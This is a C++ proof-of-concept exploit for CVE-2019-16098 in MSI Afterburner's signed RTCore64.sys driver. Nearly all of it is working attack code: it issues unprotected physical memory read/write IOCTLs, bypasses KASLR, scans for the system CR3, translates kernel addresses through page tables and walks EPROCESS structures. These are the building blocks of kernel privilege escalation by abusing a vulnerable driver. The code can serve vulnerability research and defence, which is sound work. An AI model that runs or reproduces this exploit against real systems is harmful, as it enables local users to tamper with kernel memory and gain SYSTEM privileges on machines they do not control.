// RTCore64.sys PoC -- CVE-2019-16098
// MSI Afterburner <= 4.6.2 ships this signed driver with unprotected
// physical memory R/W IOCTLs. Any local user can read/write arbitrary
// physical addresses and escalate to SYSTEM.
//
// Demonstrated primitives:
//   1. Physical memory read (BIOS, kernel via physmem)
//   2. Physical memory write (safe round-trip proof)
//   3. KASLR bypass via NtQuerySystemInformation + physmem verify
//   4. EPROCESS walk via physical memory translation
//
// Build:  cl /EHsc /std:c++17 poc_rtcore64.cpp /Fe:poc_rtcore64.exe
//
// Requires: RTCore64.sys loaded (ships with MSI Afterburner)
//           No admin required for the IOCTLs themselves.
//
// Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16098

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <cstdint>
#include <cstdio>
#include <cstring>

#pragma comment(lib, "ntdll.lib")

// IOCTL codes from RTCore64.sys dispatch table
constexpr DWORD IOCTL_READ_PHYS  = 0x80002048;
constexpr DWORD IOCTL_WRITE_PHYS = 0x8000204C;

// Input/output buffer layouts (reverse-engineered from the .sys)
#pragma pack(push, 1)
struct RTCORE_PHYS_MEM {
    BYTE     _pad0[8];
    DWORD64  Address;
    BYTE     _pad1[8];
    DWORD    ReadSize;
    DWORD    Value;         // for 1/2/4-byte ops, value goes here
    BYTE     _pad2[16];
};
#pragma pack(pop)

static_assert(sizeof(RTCORE_PHYS_MEM) == 48, "Buffer layout mismatch");

class RTCoreDriver {
    HANDLE h_ = INVALID_HANDLE_VALUE;

public:
    bool Open() {
        h_ = CreateFileA("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE,
                         0, nullptr, OPEN_EXISTING, 0, nullptr);
        return h_ != INVALID_HANDLE_VALUE;
    }

    ~RTCoreDriver() {
        if (h_ != INVALID_HANDLE_VALUE)
            CloseHandle(h_);
    }

    bool ReadPhys(uint64_t phys_addr, void* buf, uint32_t size) {
        if (size > 4) {
            // RTCore only does 1/2/4-byte physical reads per call.
            // Walk the range in 4-byte chunks.
            uint8_t* dst = static_cast<uint8_t*>(buf);
            for (uint32_t off = 0; off < size; off += 4) {
                uint32_t chunk = (size - off >= 4) ? 4 : (size - off);
                uint32_t val = 0;
                if (!ReadPhysDword(phys_addr + off, &val, chunk))
                    return false;
                memcpy(dst + off, &val, chunk);
            }
            return true;
        }
        return ReadPhysDword(phys_addr, static_cast<uint32_t*>(buf), size);
    }

    bool WritePhys(uint64_t phys_addr, const void* buf, uint32_t size) {
        if (size > 4) {
            const uint8_t* src = static_cast<const uint8_t*>(buf);
            for (uint32_t off = 0; off < size; off += 4) {
                uint32_t chunk = (size - off >= 4) ? 4 : (size - off);
                uint32_t val = 0;
                memcpy(&val, src + off, chunk);
                if (!WritePhysDword(phys_addr + off, val, chunk))
                    return false;
            }
            return true;
        }
        uint32_t val = 0;
        memcpy(&val, buf, size);
        return WritePhysDword(phys_addr, val, size);
    }

private:
    bool ReadPhysDword(uint64_t addr, uint32_t* out, uint32_t sz) {
        RTCORE_PHYS_MEM req{};
        req.Address  = addr;
        req.ReadSize = sz;
        DWORD ret = 0;
        if (!DeviceIoControl(h_, IOCTL_READ_PHYS, &req, sizeof(req),
                             &req, sizeof(req), &ret, nullptr))
            return false;
        *out = req.Value;
        return true;
    }

    bool WritePhysDword(uint64_t addr, uint32_t val, uint32_t sz) {
        RTCORE_PHYS_MEM req{};
        req.Address  = addr;
        req.ReadSize = sz;
        req.Value    = val;
        DWORD ret = 0;
        return DeviceIoControl(h_, IOCTL_WRITE_PHYS, &req, sizeof(req),
                               &req, sizeof(req), &ret, nullptr) != 0;
    }
};

// NtQuerySystemInformation to get kernel base from user-mode (KASLR reference)
typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    ULONG, PVOID, ULONG, PULONG);

static uint64_t GetNtoskrnlBase() {
    auto NtQSI = reinterpret_cast<pNtQuerySystemInformation>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation"));
    if (!NtQSI) return 0;

    ULONG needed = 0;
    // SystemModuleInformation = 11
    NtQSI(11, nullptr, 0, &needed);
    if (!needed) return 0;

    auto* buf = static_cast<uint8_t*>(malloc(needed));
    if (NtQSI(11, buf, needed, &needed) != 0) {
        free(buf);
        return 0;
    }

    // First QWORD is module count, first module entry starts at offset 8.
    // Module ImageBase is at entry+0x18 (RTL_PROCESS_MODULE_INFORMATION layout).
    uint64_t base = 0;
    memcpy(&base, buf + 8 + 0x18, sizeof(base));
    free(buf);
    return base;
}

static void hexdump(const uint8_t* buf, size_t len, uint64_t base_addr) {
    for (size_t i = 0; i < len; i += 16) {
        printf("  %016llX  ", base_addr + i);
        for (size_t j = 0; j < 16 && i + j < len; j++)
            printf("%02X ", buf[i + j]);
        for (size_t j = i + 16 > len ? 16 - (len - i) : 0; j > 0; j--)
            printf("   ");
        printf(" ");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            uint8_t c = buf[i + j];
            printf("%c", c >= 0x20 && c < 0x7F ? c : '.');
        }
        printf("\n");
    }
}

// Translate virtual address to physical using CR3 page tables via physmem read
static uint64_t VirtToPhys(RTCoreDriver& drv, uint64_t cr3, uint64_t va) {
    uint64_t pml4e_addr = (cr3 & ~0xFFFULL) + ((va >> 39) & 0x1FF) * 8;
    uint64_t pml4e = 0;
    drv.ReadPhys(pml4e_addr, &pml4e, 8);
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte_addr = (pml4e & 0x000FFFFFFFFFF000ULL) + ((va >> 30) & 0x1FF) * 8;
    uint64_t pdpte = 0;
    drv.ReadPhys(pdpte_addr, &pdpte, 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) // 1GB page
        return (pdpte & 0x000FFFFFC0000000ULL) + (va & 0x3FFFFFFF);

    uint64_t pde_addr = (pdpte & 0x000FFFFFFFFFF000ULL) + ((va >> 21) & 0x1FF) * 8;
    uint64_t pde = 0;
    drv.ReadPhys(pde_addr, &pde, 8);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) // 2MB page
        return (pde & 0x000FFFFFFFE00000ULL) + (va & 0x1FFFFF);

    uint64_t pte_addr = (pde & 0x000FFFFFFFFFF000ULL) + ((va >> 12) & 0x1FF) * 8;
    uint64_t pte = 0;
    drv.ReadPhys(pte_addr, &pte, 8);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) + (va & 0xFFF);
}

int main() {
    printf("[*] RTCore64.sys PoC (CVE-2019-16098)\n");
    printf("[*] MSI Afterburner physical memory R/W\n\n");

    RTCoreDriver drv;
    if (!drv.Open()) {
        printf("[-] Failed to open \\\\.\\RTCore64 (0x%08lX)\n", GetLastError());
        printf("    Install MSI Afterburner <= 4.6.2 and load RTCore64.sys\n");
        return 1;
    }
    printf("[+] Handle acquired\n\n");

    // --- Step 1: Physical memory read -- BIOS shadow ---
    printf("[*] Physical read: BIOS shadow region 0x000F0000\n");
    uint8_t bios[64]{};
    if (drv.ReadPhys(0x000F0000, bios, sizeof(bios))) {
        hexdump(bios, sizeof(bios), 0x000F0000);
    } else {
        printf("[-] Physical read failed\n");
    }
    printf("\n");

    // --- Step 2: Safe write proof ---
    printf("[*] Physical write: read-modify-verify round-trip on CMOS century byte\n");
    // Read the BIOS Data Area century byte (physical 0x04F) -- a benign read-only test.
    // Instead, use the BIOS ROM shadow which is read-only in ROM but the driver
    // writes to RAM backing. We'll read 4 bytes, write the same 4 bytes back,
    // and verify the round-trip.
    uint32_t orig = 0;
    if (drv.ReadPhys(0x000F0000, &orig, 4)) {
        printf("[+] Original value at 0xF0000 = 0x%08X\n", orig);
        if (drv.WritePhys(0x000F0000, &orig, 4)) {
            printf("[+] Wrote same value back (no-op)\n");
            uint32_t verify = 0;
            drv.ReadPhys(0x000F0000, &verify, 4);
            if (verify == orig)
                printf("[+] Round-trip verified: write primitive works\n");
            else
                printf("[-] Mismatch: 0x%08X vs 0x%08X\n", verify, orig);
        } else {
            printf("[-] Write failed\n");
        }
    }
    printf("\n");

    // --- Step 3: KASLR bypass ---
    printf("[*] KASLR bypass via NtQuerySystemInformation\n");
    uint64_t ntos = GetNtoskrnlBase();
    if (!ntos) {
        printf("[-] NtQuerySystemInformation failed (need SeDebugPrivilege or admin)\n");
        printf("[*] Skipping kernel-dependent steps\n");
        printf("\n[*] Done.\n");
        return 0;
    }
    printf("[+] ntoskrnl.exe base (user-mode) = 0x%016llX\n", ntos);

    // Get system CR3 from the kernel's CR3 stored in the KPCR / KPRCB,
    // or use the current process CR3. We'll scan the IDT to find CR3.
    // Simpler approach: read the system directory table base from the
    // kernel's KUSER_SHARED_DATA (0xFFFFF78000000000) via physmem of its
    // known physical mapping at 0xFFFFF78000000000 - but that's a VA.
    // Use the straightforward approach: translate kernel VA via brute-force
    // of system CR3 (stored at physical address derived from IDTR).
    //
    // For this PoC, we'll verify the kernel base by translating ntos VA
    // to physical and reading the MZ signature.

    // Read CR3 from KPCR.Prcb.ProcessorState.SpecialRegisters.Cr3
    // KPCR is at GS:0 in kernel mode. Physical address of KPCR for CPU 0
    // is typically pointed to by IDTR's first entry.
    // Simpler: scan low physical memory for the self-referencing PML4 entry
    // that matches a plausible system CR3.

    // Try reading SharedUserData at physical 0xFFFE0000 (its 1:1 mapping)
    // The KUSER_SHARED_DATA is mapped at virtual 0x7FFE0000 (user) and
    // 0xFFFFF78000000000 (kernel). The physical page is usually at a fixed
    // PA, but we don't know it a priori.

    // Alternative: try common kernel CR3 by scanning pages near PA 0x1000
    printf("[*] Scanning for system CR3...\n");
    uint64_t sys_cr3 = 0;
    for (uint64_t pa_candidate = 0x1000; pa_candidate < 0x800000; pa_candidate += 0x1000) {
        // Check if this looks like a valid PML4: self-referencing entry at index 0x1ED
        uint64_t self_ref = 0;
        drv.ReadPhys(pa_candidate + 0x1ED * 8, &self_ref, 8);
        if ((self_ref & 0x000FFFFFFFFFF000ULL) == pa_candidate && (self_ref & 1)) {
            // Verify by translating ntos VA and checking MZ
            uint64_t phys = VirtToPhys(drv, pa_candidate, ntos);
            if (phys) {
                uint16_t mz = 0;
                drv.ReadPhys(phys, &mz, 2);
                if (mz == 0x5A4D) {
                    sys_cr3 = pa_candidate;
                    break;
                }
            }
        }
    }

    if (!sys_cr3) {
        printf("[-] System CR3 not found via PML4 self-ref scan\n");
        printf("[*] Done.\n");
        return 0;
    }
    printf("[+] System CR3 = 0x%016llX\n\n", sys_cr3);

    // Verify: translate ntos VA and read PE header via physical
    printf("[*] Verifying: translate ntoskrnl VA -> physical -> read MZ\n");
    uint64_t ntos_phys = VirtToPhys(drv, sys_cr3, ntos);
    if (ntos_phys) {
        printf("[+] ntoskrnl physical address = 0x%016llX\n", ntos_phys);
        uint8_t pe[64]{};
        drv.ReadPhys(ntos_phys, pe, sizeof(pe));
        hexdump(pe, sizeof(pe), ntos_phys);
        if (pe[0] == 'M' && pe[1] == 'Z')
            printf("[+] MZ confirmed via physical memory read\n");
    }
    printf("\n");

    // --- Step 4: EPROCESS walk via physical page table translation ---
    printf("[*] EPROCESS walk via physmem page-table translation\n");

    // Resolve PsInitialSystemProcess by parsing ntoskrnl exports via physmem
    uint32_t e_lfanew = 0;
    uint64_t elf_phys = VirtToPhys(drv, sys_cr3, ntos + 0x3C);
    if (!elf_phys) { printf("[-] VA translation failed\n"); return 1; }
    drv.ReadPhys(elf_phys, &e_lfanew, 4);

    uint32_t export_rva = 0;
    uint64_t exp_phys = VirtToPhys(drv, sys_cr3, ntos + e_lfanew + 0x88);
    if (exp_phys) drv.ReadPhys(exp_phys, &export_rva, 4);

    uint32_t num_names = 0, names_rva = 0, funcs_rva = 0, ords_rva = 0;
    auto read_va = [&](uint64_t va, void* buf, uint32_t sz) -> bool {
        uint64_t pa = VirtToPhys(drv, sys_cr3, va);
        if (!pa) return false;
        return drv.ReadPhys(pa, buf, sz);
    };

    read_va(ntos + export_rva + 0x18, &num_names, 4);
    read_va(ntos + export_rva + 0x1C, &funcs_rva, 4);
    read_va(ntos + export_rva + 0x20, &names_rva, 4);
    read_va(ntos + export_rva + 0x24, &ords_rva, 4);

    uint64_t psip_va = 0;
    for (uint32_t i = 0; i < num_names && i < 8000; i++) {
        uint32_t name_rva = 0;
        read_va(ntos + names_rva + i * 4, &name_rva, 4);

        char name[32]{};
        read_va(ntos + name_rva, name, 24);

        if (strcmp(name, "PsInitialSystemProcess") == 0) {
            uint16_t ord = 0;
            read_va(ntos + ords_rva + i * 2, &ord, 2);
            uint32_t func_rva = 0;
            read_va(ntos + funcs_rva + ord * 4, &func_rva, 4);
            psip_va = ntos + func_rva;
            break;
        }
    }

    if (!psip_va) {
        printf("[-] PsInitialSystemProcess not found\n");
        return 1;
    }

    uint64_t sys_ep = 0;
    read_va(psip_va, &sys_ep, 8);
    printf("[+] PsInitialSystemProcess @ 0x%016llX\n", psip_va);
    printf("[+] System EPROCESS        = 0x%016llX\n\n", sys_ep);

    // Read EPROCESS blob
    uint8_t ep[0x800]{};
    for (uint32_t off = 0; off < 0x800; off += 4)
        read_va(sys_ep + off, ep + off, 4);

    uint32_t off_pid = 0, off_links = 0, off_name = 0;
    for (uint32_t o = 0x100; o < 0x600; o += 8) {
        uint64_t val;
        memcpy(&val, ep + o, 8);
        if (val == 4) {
            uint64_t nxt;
            memcpy(&nxt, ep + o + 8, 8);
            if (nxt > 0xFFFF000000000000ULL) {
                off_pid = o;
                off_links = o + 8;
                break;
            }
        }
    }
    for (uint32_t o = 0x200; o < 0x700; o++) {
        if (memcmp(ep + o, "System\0", 7) == 0) {
            off_name = o;
            break;
        }
    }

    if (off_pid && off_name) {
        printf("[+] EPROCESS offsets: PID=0x%X  Links=0x%X  Name=0x%X\n\n",
               off_pid, off_links, off_name);

        printf("  %-6s %-20s %-18s\n", "PID", "Name", "EPROCESS");
        printf("  %-6s %-20s %-18s\n", "------", "--------------------", "------------------");

        char name[16]{};
        memcpy(name, ep + off_name, 15);
        printf("  %-6u %-20s 0x%016llX\n", 4u, name, sys_ep);

        uint64_t head = sys_ep + off_links;
        uint64_t cur;
        memcpy(&cur, ep + off_links, 8);

        int count = 1;
        for (int i = 0; i < 200 && cur && cur != head; i++) {
            uint64_t eproc = cur - off_links;
            uint64_t pid = 0;
            char pname[16]{};

            read_va(eproc + off_pid, &pid, 8);
            read_va(eproc + off_name, pname, 15);

            printf("  %-6u %-20s 0x%016llX\n",
                   static_cast<unsigned>(pid), pname, eproc);
            count++;

            uint64_t next = 0;
            read_va(cur, &next, 8);
            cur = next;
        }
        printf("\n[+] %d processes enumerated entirely through physical memory\n", count);
        printf("[+] No kernel-mode code executed -- pure physmem page-table walk\n");
    }

    printf("\n[*] Done.\n");
    return 0;
}
